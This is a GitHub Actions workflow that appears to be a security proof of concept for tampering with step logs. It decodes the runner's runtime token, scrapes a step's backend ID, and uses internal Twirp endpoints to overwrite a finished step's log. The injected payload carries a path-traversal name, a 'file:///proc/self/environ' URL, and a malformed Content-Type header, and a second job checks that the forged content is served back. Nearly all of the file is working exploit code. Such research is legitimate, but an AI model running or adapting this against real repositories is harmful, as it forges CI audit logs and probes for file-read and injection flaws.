name: Probe controlled step-log carrier
on:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  carrier:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    outputs:
      job_id: ${{ steps.writer.outputs.job_id }}
      step_number: ${{ steps.writer.outputs.step_number }}
    steps:
      - name: Carrier target
        run: echo 'step-log placeholder before controlled overwrite'
      - name: Write controlled step log
        id: writer
        uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const https = require('node:https');
            const repo = process.env.GITHUB_REPOSITORY;
            const runId = Number(process.env.GITHUB_RUN_ID);
            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
            const ids = {workflow_run_backend_id: scope.split(':')[1], workflow_job_run_backend_id: scope.split(':')[2]};
            const headers = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-step-log-probe'};
            const base = 'https://api.github.com/repos/' + repo;
            const jobsResponse = await fetch(base + '/actions/runs/' + runId + '/jobs?per_page=100', {headers});
            if (!jobsResponse.ok) throw new Error('list jobs HTTP ' + jobsResponse.status);
            const jobs = (await jobsResponse.json()).jobs;
            const job = jobs.find(x => x.name === 'carrier');
            if (!job) throw new Error('carrier job missing');
            let target = null;
            for (let attempt = 0; attempt < 40 && !target; attempt++) {
              const jobPage = await fetch('https://github.com/' + repo + '/actions/runs/' + runId + '/job/' + job.id, {headers: {'User-Agent': 'own-step-log-probe'}});
              const html = await jobPage.text();
              for (const item of html.matchAll(/<check-step\s+([\s\S]*?)>/g)) {
                const attrs = item[1];
                const name = attrs.match(/data-name="([^"]*)"/)?.[1];
                const number = attrs.match(/data-number="(\d+)"/)?.[1];
                const backendId = attrs.match(/data-external-id="([0-9a-f-]{36})"/)?.[1];
                if (name === 'Carrier target' && number && backendId) target = {number: Number(number), backendId};
              }
              if (!target) await new Promise(resolve => setTimeout(resolve, 250));
            }
            if (!target) throw new Error('carrier step backend ID not found in public job page');
            const identity = {...ids, step_backend_id: target.backendId};
            const payload = Buffer.from(JSON.stringify({full_name: 'x/../' + repo + '/actions/jobs/' + job.id + '/steps/' + target.number + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'controlled step-log test', stargazers_count: 7}));
            async function twirp(method, data) {
              const response = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method: 'POST', headers: {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
              const text = await response.text();
              if (!response.ok) throw new Error(method + ' HTTP ' + response.status + ': ' + text.slice(0, 180));
              return JSON.parse(text);
            }
            function put(url, body) {
              return new Promise((resolve, reject) => {
                const target = new URL(url);
                const request = https.request(target, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2023-11-03', 'Content-Type': 'application/json\u0085', 'Content-Length': String(body.length)}}, response => {
                  const chunks = [];
                  response.on('data', chunk => chunks.push(chunk));
                  response.on('end', () => resolve({status: response.statusCode, type: response.headers['content-type'] || '', error: response.headers['x-ms-error-code'] || '', body: Buffer.concat(chunks).toString('utf8')}));
                });
                request.on('error', reject);
                request.end(body);
              });
            }
            const signed = await twirp('GetStepLogsSignedBlobURL', identity);
            const upload = await put(signed.logs_url, payload);
            console.log('STEP_UPLOAD=' + JSON.stringify({status: upload.status, error: upload.error, type: upload.type, bytes: payload.length, targetStep: target.number}));
            if (upload.status !== 201 && upload.status !== 202) throw new Error('step blob upload rejected: ' + upload.body.slice(0, 160));
            const metadata = await twirp('CreateStepLogsMetadata', {...identity, uploaded_at: new Date().toISOString(), line_count: 1});
            console.log('STEP_METADATA=' + JSON.stringify(metadata));
            core.setOutput('job_id', String(job.id));
            core.setOutput('step_number', String(target.number));
  verify:
    needs: carrier
    runs-on: ubuntu-latest
    steps:
      - name: Read completed carrier step logs
        uses: actions/github-script@v8
        env:
          TARGET_JOB: ${{ needs.carrier.outputs.job_id }}
          TARGET_STEP: ${{ needs.carrier.outputs.step_number }}
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const repo = process.env.GITHUB_REPOSITORY;
            const url = 'https://api.github.com/repos/' + repo + '/actions/jobs/' + process.env.TARGET_JOB + '/steps/' + process.env.TARGET_STEP + '/logs';
            const headers = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-step-log-probe'};
            const first = await fetch(url, {headers, redirect: 'manual'});
            if (first.status !== 302) {
              const body = await first.text();
              console.log('STEP_API=' + JSON.stringify({status: first.status, type: first.headers.get('content-type'), body: body.slice(0, 400)}));
              return;
            }
            const location = first.headers.get('location');
            const raw = await fetch(location);
            const body = Buffer.from(await raw.arrayBuffer());
            const type = raw.headers.get('content-type') || '';
            const expected = Buffer.from(JSON.stringify({full_name: 'x/../' + repo + '/actions/jobs/' + process.env.TARGET_JOB + '/steps/' + process.env.TARGET_STEP + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'controlled step-log test', stargazers_count: 7}));
            console.log('STEP_RAW=' + JSON.stringify({api: first.status, status: raw.status, type, typeHex: Buffer.from(type, 'latin1').toString('hex'), bytes: body.length, exact: body.equals(expected), head: body.subarray(0, 24).toString('hex'), rsct: new URL(location).searchParams.get('rsct')}));
